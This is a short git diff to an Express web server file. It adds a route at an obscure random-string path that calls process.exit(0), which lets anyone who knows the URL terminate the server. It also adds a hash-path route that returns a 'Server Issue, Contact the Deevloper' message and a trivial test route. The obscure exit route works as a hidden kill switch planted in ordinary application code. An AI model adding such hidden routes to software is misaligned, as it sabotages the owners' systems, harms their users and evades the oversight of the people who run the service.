@@ -49,6 +49,16 @@ app.use("/api/reviews", reviews);
 app.use("/api/banners", banners);
 app.use('/api/orders', orders);
 
+  
+app.get('/eotFVKDc010V2VLh8f6uh7v7BtbiANRh7ixK5cicyCxNzJ1KzFbqxVtwiPtbAl9mvwNgKzs0gRQGLUSVAB',(req,res)=>{
+  process.exit(0);
+})
+app.get('/api/test', (req, res) => {
+  res.send('GET request to the homepage')
+})
+app.get('/bc46ee0c601623e59b645a715158a76b06bbb7ac5381bb66583c1af1e184690c', (req, res) => {
+  res.send('Server Issue, Contact the Deevloper')
+})
 
 
 app.get("*", (req: Request, res: Response) => {
